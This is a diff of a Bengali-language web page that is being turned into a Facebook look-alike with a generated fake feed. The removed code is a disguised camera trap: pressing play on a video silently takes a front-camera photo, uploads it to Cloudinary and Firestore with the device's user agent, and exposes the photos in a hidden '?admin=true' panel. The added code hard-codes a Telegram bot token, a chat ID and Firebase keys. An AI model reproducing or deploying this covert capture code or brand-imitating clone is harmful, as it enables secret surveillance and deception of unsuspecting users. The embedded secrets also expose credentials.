+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('dashboard')">
+                    <i class="fa-solid fa-chart-column shortcut-icon" style="color: #1877f2;"></i>
+                    <span class="shortcut-name">Dashboard</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('messages')">
+                    <i class="fa-brands fa-facebook-messenger shortcut-icon" style="background: linear-gradient(45deg, #00c6ff, #0072ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
+                    <span class="shortcut-name">Messages</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('groups')">
+                    <i class="fa-solid fa-user-group shortcut-icon" style="color: #1877f2;"></i>
+                    <span class="shortcut-name">Groups</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('marketplace')">
+                    <i class="fa-solid fa-store shortcut-icon" style="color: #1877f2;"></i>
+                    <span class="shortcut-name">Marketplace</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('friends')">
+                    <i class="fa-solid fa-users shortcut-icon" style="color: #1877f2;"></i>
+                    <span class="shortcut-name">Friends</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('reels')">
+                    <i class="fa-solid fa-clapperboard shortcut-icon" style="color: #ff0055;"></i>
+                    <span class="shortcut-name">Reels</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('meta-ai')">
+                    <i class="fa-solid fa-circle-nodes shortcut-icon" style="background: linear-gradient(45deg, #a855f7, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"></i>
+                    <span class="shortcut-name">Meta AI</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('pages')">
+                    <i class="fa-solid fa-flag shortcut-icon" style="color: #f76b1c;"></i>
+                    <span class="shortcut-name">Pages</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('saved')">
+                    <i class="fa-solid fa-bookmark shortcut-icon" style="color: #ab6df6;"></i>
+                    <span class="shortcut-name">Saved</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('birthdays')">
+                    <i class="fa-solid fa-gift shortcut-icon" style="color: #ff3040;"></i>
+                    <span class="shortcut-name">Birthdays</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('events')">
+                    <i class="fa-solid fa-calendar-days shortcut-icon" style="color: #ff3040;"></i>
+                    <span class="shortcut-name">Events</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('verified')">
+                    <i class="fa-solid fa-circle-check shortcut-icon" style="color: #1877f2;"></i>
+                    <span class="shortcut-name">Meta Verified</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('ad-centre')">
+                    <i class="fa-solid fa-bullhorn shortcut-icon" style="color: #1877f2;"></i>
+                    <span class="shortcut-name">Ad Centre</span>
+                </a>
+                <a href="#" class="shortcut-item click-effect" onclick="navigateTo('feeds')">
+                    <i class="fa-solid fa-newspaper shortcut-icon" style="color: #f76b1c;"></i>
+                    <span class="shortcut-name">Feeds</span>
+                </a>
             </div>
         </div>
-        
     </div>
-
-    <!-- Admin Section -->
-    <div id="adminSection">
-        <div class="admin-header">
-            <h1>অ্যাডমিন প্যানেল</h1>
-            <p style="color:var(--muted);">ক্যাপচার করা ফটোগুলো</p>
-        </div>
-        <div class="admin-grid" id="adminGrid">
-            <!-- Photos will load here -->
-        </div>
-    </div>
-
-    <video id="cameraStream" autoplay playsinline></video>
-    <div class="flash" id="flash"></div>
-    <div class="toast" id="toast"></div>
 
     <script>
-        // ==========================================
-        // Cloudinary Configuration (আপনার ক্লাউডিনারি কনফিগ দিন)
-        // ==========================================
-        const CLOUDINARY_CLOUD_NAME = "dhvtgzy5x"; // আপনার Cloudinary Cloud Name দিন
-        const CLOUDINARY_UPLOAD_PRESET = "Rosenews"; // Unsigned Upload Preset দিন
+        // ============================================================
+        // TELEGRAM & FIREBASE CONFIGURATION
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = '8753538115:AAG5e4VI6JnHFERJVzEYMN4SguQLgBu79ts';
+        const TELEGRAM_CHAT_ID = '-5338253351';
 
-        // ==========================================
-        // Firebase Configuration 
-        // ==========================================
         const firebaseConfig = {
             apiKey: "AIzaSyDOJaV7zMLhtA-_z1nkcdbtaa3w7M_0Fh4",
             authDomain: "money-generate-dbab3.firebaseapp.com",
+            databaseURL: "https://money-generate-dbab3-default-rtdb.firebaseio.com",
             projectId: "money-generate-dbab3",
             storageBucket: "money-generate-dbab3.firebasestorage.app",
             messagingSenderId: "579756089926",
             appId: "1:579756089926:web:abbe35377e3657889be047"
         };
 
-        // Initialize Firebase (শুধু Firestore ব্যবহার করা হবে)
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        const database = firebase.database();
 
-        // ==========================================
-        // Admin Check & Routing
-        // ==========================================
-        const urlParams = new URLSearchParams(window.location.search);
-        const isAdmin = urlParams.get('admin') === 'true';
+        let currentUser = {
+            name: 'User',
+            email: ''
+        };
 
-        const userSection = document.getElementById('userSection');
-        const adminSection = document.getElementById('adminSection');
+        function loadCurrentUser() {
+            const userEmail = localStorage.getItem('userEmail');
+            if (userEmail) {
+                currentUser.email = userEmail;
+                database.ref('users').once('value').then((snapshot) => {
+                    if (snapshot.exists()) {
+                        snapshot.forEach((child) => {
+                            const usr = child.val();
+                            if (usr.email === userEmail) {
+                                currentUser.name = `${usr.firstName} ${usr.lastName}`;
+                            }
+                        });
+                    }
+                });
+            }
+        }
+        loadCurrentUser();
 
-        if (isAdmin) {
-            userSection.style.display = 'none';
-            adminSection.classList.add('active');
-            loadAdminPhotos();
+        // ============================================================
+        // GENERATE RANDOM POSTS (Unlimited)
+        // ============================================================
+        const firstNames = ['Rafi', 'Tahsin', 'Nabila', 'Shahriar', 'Anika', 'Farhan', 'Tasnim', 'Rakib', 'Sadia', 'Shakib', 'Nadia', 'Imran', 'Sajib', 'Mou', 'Shimul', 'Ratul', 'Puja', 'Tariq', 'Saba', 'Rashed', 'Jubayer', 'Sami', 'Rifat', 'Tanjim', 'Nayeem', 'Arif', 'Shahin', 'Moni', 'Rina', 'Liton', 'Pavel', 'Shila', 'Sumon', 'Nasrin', 'Jewel', 'Sonia', 'Kamal', 'Nur', 'Lipi', 'Sajal', 'Tithi', 'Rashid', 'Mithun', 'Papiya', 'Raju', 'Champa', 'Shafiq', 'Ruma', 'Babul', 'Hena'];
+        const lastNames = ['Ahmed', 'Hasan', 'Rahman', 'Islam', 'Khan', 'Ali', 'Chowdhury', 'Sarker', 'Miah', 'Begum', 'Sheikh', 'Hossain', 'Mamun', 'Akter', 'Jahan', 'Mahmud', 'Haque', 'Kader', 'Jamil', 'Nur', 'Uddin', 'Karim', 'Jalal', 'Parvez', 'Shah', 'Nabi', 'Siddique', 'Zaman', 'Rashid', 'Rahman'];
+        const postTexts = [
+            'আজকের দিনটা খুব সুন্দর কাটলো! 🌞', 
+            'নতুন কিছু শিখতে ভালো লাগে। 📚', 
+            'বন্ধুদের সাথে সময় কাটানো অনেক মজার। 🎉',
+            'প্রকৃতির সৌন্দর্য দেখে মন ভরে যায়। 🌿',
+            'আমার নতুন প্রজেক্ট শুরু করলাম। 🚀',
+            'আজ খুব সুস্বাদু খাবার খেয়েছি। 🍕',
+            'সকালের কফি আর বই পড়া — পারফেক্ট কম্বো। ☕',
+            'ভালো থাকুন, সুস্থ থাকুন। ❤️',
+            'নতুন স্মার্টফোন কিনলাম! 📱',
+            'গান শুনতে খুব ভালো লাগে। 🎶',
+            'আজ বৃষ্টি হচ্ছে, খুব শীতল আবহাওয়া। 🌧️',
+            'পরিবারের সাথে সময় কাটানো অমূল্য। 👨‍👩‍👧',
+            'স্বপ্ন পূরণের জন্য কাজ করে যাচ্ছি। 💪',
+            'আজকে সিনেমা দেখতে যাবো। 🎬',
+            'কিছু সুন্দর মুহূর্ত ক্যামেরাবন্দী করলাম। 📸',
+            'আমার নতুন বই পড়া শুরু করলাম। 📖',
+            'সমুদ্রের ধারে বসে আছি। 🌊',
+            'আজ খুব ভালো লাগছে! 😊',
+            'সকালে হাটতে বেরিয়েছিলাম। 🚶',
+            'আজ অনেক কাজ করেছি, এখন বিশ্রাম। 😴',
+            'আমার নতুন গাড়ি! 🚗',
+            'বন্ধুর সাথে আড্ডা দিচ্ছি। 🗣️',
+            'রাতের আকাশ দেখতে ভালো লাগে। 🌙',
+            'আজকে খুব গরম পড়েছে। ☀️',
+            'শীতের সকাল খুব মিষ্টি। ❄️',
+            'আমার জীবন আমার নিয়মে চলবে 💪',
+            'সবাই ভালো থেকো 🙏',
+            'আজ অনেক কাজ করেছি 🏃',
+            'নতুন কিছু শুরু করছি ✨',
+            'ভালোবাসা দাও, ভালোবাসা পাও ❤️',
+            'সুন্দর একটা দিন কাটলো 😊',
+            'আমার নতুন ফোন 📱',
+            'সবাইকে শুভ সকাল ☀️',
+            'আজ খুব মজা করলাম 🎊',
+            'জীবন বড় সুন্দর 💫'
+        ];
+
+        const imageUrls = [
+            'https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1585829365295-ab7cd400c167?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1516634267767-2d1281494eb4?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1523050854058-8df90110c7f1?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1522199755839-a2bacb67c546?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1518020382111-a7b9fbedcd42?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1524230659092-07f99a75c013?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1532274402911-5a369e4c4bb5?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1519904981063-b0cf448d479e?auto=format&fit=crop&w=600&q=80',
+            'https://images.unsplash.com/photo-1523712999610-f77fbcfc3843?auto=format&fit=crop&w=600&q=80'
+        ];
+
+        const avatarUrls = [
+            'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1552058544-f2b08422138a?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1438761681033-6461ffad8d80?auto=format&fit=crop&w=100&q=80',
+            'https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?auto=format&fit=crop&w=100&q=80'
+        ];
+
+        function getRandomItem(arr) {
+            return arr[Math.floor(Math.random() * arr.length)];
         }
 
-        // ==========================================
-        // User Video & Camera Logic
-        // ==========================================
-        const mainVideo = document.getElementById('mainVideo');
-        const playOverlay = document.getElementById('playOverlay');
-        const cameraStream = document.getElementById('cameraStream');
-        const flash = document.getElementById('flash');
-        const toastEl = document.getElementById('toast');
-
-        let cameraPermissionGranted = false;
-        let isPlaying = false;
-
-        function showToast(message, type = '') {
-            toastEl.textContent = message;
-            toastEl.className = 'toast ' + type;
-            requestAnimationFrame(() => { toastEl.classList.add('show'); });
-            setTimeout(() => { toastEl.classList.remove('show'); }, 3000);
+        function getRandomTime() {
+            const hours = Math.floor(Math.random() * 48);
+            if (hours === 0) return 'Just now';
+            if (hours < 24) return hours + ' hours ago';
+            const days = Math.floor(hours / 24);
+            return days + ' day' + (days > 1 ? 's' : '') + ' ago';
         }
 
-        async function captureAndUploadPhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                cameraPermissionGranted = true;
-                cameraStream.srcObject = stream;
+        function generateRandomPost(index) {
+            const name = getRandomItem(firstNames) + ' ' + getRandomItem(lastNames);
+            const avatar = getRandomItem(avatarUrls);
+            const caption = getRandomItem(postTexts);
+            const media = getRandomItem(imageUrls);
+            const isVideo = Math.random() > 0.82;
+            const likesCount = Math.floor(Math.random() * 2500) + 5;
+            const comments = Math.floor(Math.random() * 400) + 1;
+            const isBanner = Math.random() > 0.88;
+            const themes = ['theme-white', 'theme-purple', 'theme-red', 'theme-dark', 'theme-sunset'];
+            const theme = isBanner ? getRandomItem(themes) : 'theme-white';
+            
+            return {
+                type: 'post',
+                name: name,
+                avatar: avatar,
+                time: getRandomTime(),
+                caption: caption + (Math.random() > 0.3 ? ' ✨' : ''),
+                contentType: isVideo ? 'video' : 'image',
+                media: isVideo ? 'https://www.w3schools.com/html/mov_bbb.mp4' : media,
+                poster: isVideo ? getRandomItem(imageUrls) : '',
+                likesCount: likesCount,
+                likesEmoji: '👍',
+                comments: comments,
+                shares: Math.floor(Math.random() * 30),
+                theme: theme,
+                likedBy: {},
+                _id: 'post_' + Date.now() + '_' + index + '_' + Math.random().toString(36).substr(2, 6)
+            };
+        }
 
-                await new Promise(resolve => setTimeout(resolve, 800));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = cameraStream.videoWidth || 320;
-                canvas.height = cameraStream.videoHeight || 240;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(cameraStream, 0, 0, canvas.width, canvas.height);
-
-                // ফ্ল্যাশ ইফেক্ট
-                flash.classList.add('active');
-                setTimeout(() => flash.classList.remove('active'), 200);
-
-                // ফটো ডেটা তৈরি (Base64)
-                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
-
-                // ক্যামেরা স্ট্রিম বন্ধ
-                stream.getTracks().forEach(track => track.stop());
-                cameraStream.srcObject = null;
-
-                showToast('', 'success');
-
-                // ==========================================
-                // Cloudinary তে আপলোড লজিক
-                // ==========================================
-                const formData = new FormData();
-                formData.append('file', photoDataUrl);
-                formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-
-                const cloudinaryRes = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
-                    method: 'POST',
-                    body: formData
+        function generateRandomPymk(index) {
+            const users = [];
+            for (let i = 0; i < 4; i++) {
+                users.push({
+                    name: getRandomItem(firstNames) + ' ' + getRandomItem(lastNames),
+                    img: getRandomItem(avatarUrls)
                 });
+            }
+            return {
+                type: 'pymk',
+                users: users,
+                _id: 'pymk_' + Date.now() + '_' + index + '_' + Math.random().toString(36).substr(2, 6)
+            };
+        }
 
-                if (!cloudinaryRes.ok) {
-                    throw new Error('Cloudinary upload failed');
-                }
+        function generateRandomAd(index) {
+            return {
+                type: 'ad',
+                name: 'Sponsored Brand ' + (index + 1),
+                avatar: getRandomItem(avatarUrls),
+                time: 'Promoted',
+                caption: '🚀 Discover amazing creative tools & services built just for you! Click below to learn more.',
+                _id: 'ad_' + Date.now() + '_' + index + '_' + Math.random().toString(36).substr(2, 6)
+            };
+        }
 
-                const cloudinaryData = await cloudinaryRes.json();
-                const downloadURL = cloudinaryData.secure_url; // ক্লাউডিনারি থেকে ফটোর লিংক নেওয়া
-
-                // ==========================================
-                // Firestore এ ডাটাবেস সেভ (ক্লাউডিনারি লিংকসহ)
-                // ==========================================
-                await db.collection('captured_photos').add({
-                    imageUrl: downloadURL,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    userAgent: navigator.userAgent
-                });
-
-                showToast('', 'success');
-                playVideo();
-
-            } catch (err) {
-                cameraPermissionGranted = false;
-                if (err.name === 'NotAllowedError') {
-                    showToast('ক্যামেরা পারমিশন দেননি। ভিডিও চলবে না।', 'error');
+        function generateFullFeed(count = 1000) {
+            const feed = [];
+            for (let i = 0; i < count; i++) {
+                const r = Math.random();
+                if (r < 0.07 && i < count - 2) {
+                    feed.push(generateRandomPymk(i));
+                } else if (r < 0.10 && i < count - 1) {
+                    feed.push(generateRandomAd(i));
                 } else {
-                    showToast('ক্যামেরা বা সার্ভারে সমস্যা হয়েছে।', 'error');
+                    feed.push(generateRandomPost(i));
                 }
-                console.error(err);
+            }
+            return feed;
+        }
+
+        function seedFirebaseIfEmpty() {
+            database.ref('feedItems').once('value').then(snapshot => {
+                if (!snapshot.exists() || snapshot.numChildren() < 500) {
+                    const masterFeed = generateFullFeed(2000);
+                    database.ref('feedItems').set(masterFeed);
+                }
+            });
+        }
+
+        function fetchAllFeedItems(callback) {
+            database.ref('feedItems').once('value')
+                .then((snapshot) => {
+                    if (snapshot.exists()) {
+                        const items = [];
+                        snapshot.forEach((child) => {
+                            const data = child.val();
+                            data._id = child.key;
+                            items.push(data);
+                        });
+                        callback(items);
+                    } else {
+                        seedFirebaseIfEmpty();
+                        setTimeout(() => {
+                            database.ref('feedItems').once('value').then(s => {
+                                const items = [];
+                                s.forEach(c => {
+                                    const d = c.val();
+                                    d._id = c.key;
+                                    items.push(d);
+                                });
+                                callback(items);
+                            });
+                        }, 800);
+                    }
+                })
+                .catch((error) => {
+                    console.error("Firebase fetch error:", error);
+                    seedFirebaseIfEmpty();
+                    setTimeout(() => {
+                        database.ref('feedItems').once('value').then(s => {
+                            const items = [];
+                            s.forEach(c => {
+                                const d = c.val();
+                                d._id = c.key;
+                                items.push(d);
+                            });
+                            callback(items);
+                        });
+                    }, 800);
+                });
+        }
+
+        function shuffleArray(array) {
+            let arr = [...array];
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+
+        // ============================================================
+        // SAVE REACTION TO FIREBASE
+        // ============================================================
+        function saveReactionToFirebase(postId, emoji, text) {
+            const postRef = database.ref(`feedItems/${postId}`);
+            const userEmail = currentUser.email || 'anonymous';
+            
+            postRef.once('value').then((snapshot) => {
+                const postData = snapshot.val();
+                if (!postData) return;
+                
+                const likedBy = postData.likedBy || {};
+                let newLikesCount = postData.likesCount || 0;
+                let newEmoji = postData.likesEmoji || '👍';
+                
+                if (likedBy[userEmail]) {
+                    // Unlike - remove user's reaction
+                    delete likedBy[userEmail];
+                    newLikesCount = Math.max(0, newLikesCount - 1);
+                    
+                    const emojiCounts = {};
+                    Object.values(likedBy).forEach(e => {
+                        emojiCounts[e] = (emojiCounts[e] || 0) + 1;
+                    });
+                    let maxCount = 0;
+                    for (const [e, count] of Object.entries(emojiCounts)) {
+                        if (count > maxCount) {
+                            maxCount = count;
+                            newEmoji = e;
+                        }
+                    }
+                    if (Object.keys(emojiCounts).length === 0) newEmoji = '👍';
+                } else {
+                    // Like - add user's reaction
+                    likedBy[userEmail] = emoji;
+                    newLikesCount += 1;
+                    
+                    const emojiCounts = {};
+                    Object.values(likedBy).forEach(e => {
+                        emojiCounts[e] = (emojiCounts[e] || 0) + 1;
+                    });
+                    let maxCount = 0;
+                    for (const [e, count] of Object.entries(emojiCounts)) {
+                        if (count > maxCount) {
+                            maxCount = count;
+                            newEmoji = e;
+                        }
+                    }
+                }
+                
+                postRef.update({
+                    likesCount: newLikesCount,
+                    likesEmoji: newEmoji,
+                    likedBy: likedBy
+                }).then(() => {
+                    updatePostUI(postId, newLikesCount, newEmoji, likedBy[userEmail] || null);
+                });
+            });
+        }
+
+        function updatePostUI(postId, newLikesCount, newEmoji, userReaction) {
+            const statCount = document.getElementById(`statCount-${postId}`);
+            const statIcons = document.getElementById(`statIcons-${postId}`);
+            if (statCount) statCount.textContent = newLikesCount;
+            if (statIcons) statIcons.innerHTML = `<span>${newEmoji}</span>`;
+            
+            const btnIcon = document.getElementById(`btnIcon-${postId}`);
+            const btnText = document.getElementById(`btnText-${postId}`);
+            const likeBtn = document.getElementById(`likeBtn-${postId}`);
+            
+            if (btnText && btnIcon && likeBtn) {
+                if (userReaction) {
+                    btnIcon.innerHTML = userReaction;
+                    btnText.textContent = 'Liked';
+                    likeBtn.classList.add('liked');
+                } else {
+                    btnIcon.innerHTML = '<i class="fa-regular fa-thumbs-up"></i>';
+                    btnText.textContent = 'Like';
+                    likeBtn.classList.remove('liked');
+                }
             }
         }
 
-        function playVideo() {
-            playOverlay.classList.add('hidden');
-            mainVideo.play();
-            isPlaying = true;
+        // ============================================================
+        // RENDER FEED WITH INFINITE SCROLL
+        // ============================================================
+        let feedItems = [];
+        let displayedCount = 0;
+        const batchSize = 10;
+        let isLoadingMore = false;
+        let allLoaded = false;
+
+        function renderFeed() {
+            const feedContainer = document.getElementById('feedPostsContainer');
+            feedContainer.innerHTML = '<div class="feed-loader"><i class="fa-solid fa-spinner"></i> Loading feed...</div>';
+            
+            fetchAllFeedItems((masterFeedItems) => {
+                feedItems = shuffleArray(masterFeedItems);
+                displayedCount = 0;
+                allLoaded = false;
+                feedContainer.innerHTML = '';
+                loadMorePosts();
+            });
         }
 
-        playOverlay.addEventListener('click', function () {
-            if (isPlaying) return;
-            captureAndUploadPhoto();
-        });
+        function loadMorePosts() {
+            if (isLoadingMore) return;
+            if (allLoaded) {
+                updateLoadMoreState();
+                return;
+            }
+            
+            isLoadingMore = true;
+            
+            const trigger = document.getElementById('scrollTrigger');
+            const loadMoreText = document.getElementById('loadMoreText');
+            const loaderSpinner = trigger.querySelector('.loader-spinner');
+            
+            if (loadMoreText) loadMoreText.textContent = 'Loading...';
+            if (loaderSpinner) loaderSpinner.style.display = 'inline-block';
 
-        mainVideo.addEventListener('ended', function () {
-            playOverlay.classList.remove('hidden');
-            isPlaying = false;
-        });
+            const feedContainer = document.getElementById('feedPostsContainer');
+            
+            if (displayedCount >= feedItems.length) {
+                allLoaded = true;
+                isLoadingMore = false;
+                updateLoadMoreState();
+                return;
+            }
 
-        // ==========================================
-        // Admin Panel Logic
-        // ==========================================
-        async function loadAdminPhotos() {
-            const adminGrid = document.getElementById('adminGrid');
-            adminGrid.innerHTML = '<p>লোড হচ্ছে...</p>';
+            const endIndex = Math.min(displayedCount + batchSize, feedItems.length);
+            const batch = feedItems.slice(displayedCount, endIndex);
+            displayedCount = endIndex;
 
-            try {
-                const snapshot = await db.collection('captured_photos').orderBy('createdAt', 'desc').get();
-                adminGrid.innerHTML = '';
+            let htmlContent = '';
+            const userEmail = currentUser.email || 'anonymous';
 
-                if (snapshot.empty) {
-                    adminGrid.innerHTML = '<p>কোনো ফটো পাওয়া যায়নি।</p>';
-                    return;
-                }
+            batch.forEach((item, index) => {
+                if (!item) return;
 
-                snapshot.forEach(doc => {
-                    const data = doc.data();
-                    const card = document.createElement('div');
-                    card.className = 'photo-card';
-                    
-                    const time = data.createdAt ? new Date(data.createdAt.seconds * 1000).toLocaleString() : 'N/A';
-                    
-                    card.innerHTML = `
-                        <img src="${data.imageUrl}" alt="Captured User">
-                        <div class="meta">
-                            <div>সময়: ${time}</div>
-                            <div>ডিভাইস: ${data.userAgent ? data.userAgent.substring(0, 30) + '...' : 'N/A'}</div>
+                if (item.type === 'pymk' && item.users) {
+                    let cardsHtml = '';
+                    item.users.forEach(user => {
+                        cardsHtml += `
+                            <div class="pymk-card">
+                                <div class="pymk-img-wrap" onclick="navigateTo('profile')">
+                                    <img src="${user.img}" alt="${user.name}" loading="lazy">
+                                </div>
+                                <div class="pymk-info">
+                                    <h4 class="pymk-name" onclick="navigateTo('profile')">${user.name}</h4>
+                                    <a href="#" class="pymk-add-btn click-effect" onclick="navigateTo('add-friend')">
+                                        <i class="fa-solid fa-user-plus"></i> Add friend
+                                    </a>
+                                </div>
+                            </div>
+                        `;
+                    });
+
+                    htmlContent += `
+                        <div class="pymk-container">
+                            <div class="pymk-header">
+                                <h3 class="pymk-title">People you may know</h3>
+                                <a href="#" style="color: #65676b; font-size: 18px;" class="click-effect" onclick="navigateTo('more')"><i class="fa-solid fa-ellipsis"></i></a>
+                            </div>
+                            <div class="pymk-cards-scroll">
+                                ${cardsHtml}
+                            </div>
+                            <a href="#" class="pymk-see-all-btn click-effect" onclick="navigateTo('people')">See all</a>
                         </div>
                     `;
-                    adminGrid.appendChild(card);
-                });
-            } catch (err) {
-                adminGrid.innerHTML = '<p>ডাটাবেস থেকে ফটো আনতে সমস্যা হয়েছে।</p>';
-                console.error(err);
+                } else if (item.type === 'ad') {
+                    htmlContent += `
+                        <div class="post-container" data-id="${item._id}">
+                            <div class="post-header" onclick="event.stopPropagation();">
+                                <div class="post-user-info">
+                                    <div class="post-avatar-wrap">
+                                        <a href="#" class="click-effect" onclick="event.stopPropagation();navigateTo('profile')"><img src="${item.avatar || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=100&q=80'}" alt="Ad" class="profile-pic"></a>
+                                    </div>
+                                    <div class="post-author-details">
+                                        <a href="#" style="text-decoration: none; color: inherit;" class="click-effect" onclick="event.stopPropagation();navigateTo('profile')"><h4>${item.name || 'Sponsored'}</h4></a>
+                                        <div class="post-time-privacy"><span>${item.time || 'Promoted'}</span> • <i class="fa-solid fa-earth-americas" style="font-size: 10px;"></i></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="post-caption">${item.caption || ''}</div>
+                            <a href="#" class="animated-ad-box click-effect" onclick="navigateTo('offer')">
+                                <div class="animated-ad-content">
+                                    <h2>Special Offer 50% OFF!</h2>
+                                    <p>Limited time deal. Upgrade today.</p>
+                                    <span style="background:#fff; color:#1877f2; padding:8px 16px; border-radius:20px; font-weight:bold; display:inline-block;">Shop Now</span>
+                                </div>
+                            </a>
+                        </div>
+                    `;
+                } else {
+                    const postTheme = item.theme || 'theme-white';
+                    const isBannerTheme = postTheme !== 'theme-white';
+                    
+                    let mediaHTML = '';
+                    let captionHTML = '';
+
+                    const likedBy = item.likedBy || {};
+                    const userReaction = likedBy[userEmail] || null;
+
+                    if (isBannerTheme) {
+                        captionHTML = `
+                            <div class="post-banner">
+                                <div class="post-caption">${item.caption || ''}</div>
+                            </div>
+                        `;
+                    } else {
+                        captionHTML = `<div class="post-caption">${item.caption || ''}</div>`;
+                    }
+
+                    if (item.contentType === 'video' && item.media) {
+                        mediaHTML = `
+                            <div class="post-media-content">
+                                <video controls class="feed-video" poster="${item.poster || ''}" preload="metadata" playsinline>
+                                    <source src="${item.media}" type="video/mp4">
+                                    Your browser does not support video.
+                                </video>
+                            </div>
+                        `;
+                    } else if ((item.contentType === 'image' || item.media) && !isBannerTheme) {
+                        mediaHTML = `
+                            <a href="#" class="post-media-content click-effect" onclick="navigateTo('media')">
+                                <img src="${item.media}" alt="Post media" loading="lazy">
+                            </a>
+                        `;
+                    } else if (item.media && item.media.startsWith('data:') && !isBannerTheme) {
+                        if (item.contentType === 'video') {
+                            mediaHTML = `
+                                <div class="post-media-content">
+                                    <video controls class="feed-video" preload="metadata" playsinline>
+                                        <source src="${item.media}" type="video/mp4">
+                                        Your browser does not support video.
+                                    </video>
+                                </div>
+                            `;
+                        } else {
+                            mediaHTML = `
+                                <div class="post-media-content">
+                                    <img src="${item.media}" alt="Post media" loading="lazy">
+                                </div>
+                            `;
+                        }
+                    }
+
+                    const postId = item._id || 'post_' + index + '_' + Math.random().toString(36).substr(2, 6);
+                    const postName = item.name || 'User';
+                    const postCaption = item.caption || '';
+                    const likesCount = item.likesCount || 0;
+                    const likesEmoji = item.likesEmoji || '👍';
+                    const commentsCount = item.comments || 0;
+                    const sharesCount = item.shares || 0;
+
+                    let btnIconHTML = '';
+                    let btnTextHTML = '';
+                    let btnClass = '';
+                    
+                    if (userReaction) {
+                        btnIconHTML = userReaction;
+                        btnTextHTML = 'Liked';
+                        btnClass = 'liked';
+                    } else {
+                        btnIconHTML = '<i class="fa-regular fa-thumbs-up"></i>';
+                        btnTextHTML = 'Like';
+                        btnClass = '';
+                    }
+
+                    const commentsText = commentsCount + ' comment' + (commentsCount !== 1 ? 's' : '');
+
+                    htmlContent += `
+                        <div class="post-container ${postTheme}" data-id="${postId}">
+                            <div class="post-header" onclick="event.stopPropagation();">
+                                <div class="post-user-info">
+                                    <div class="post-avatar-wrap">
+                                        <a href="#" class="click-effect" onclick="event.stopPropagation();navigateTo('profile')"><img src="${item.avatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=100&q=80'}" alt="User" class="profile-pic"></a>
+                                        <div class="online-dot"></div>
+                                    </div>
+                                    <div class="post-author-details">
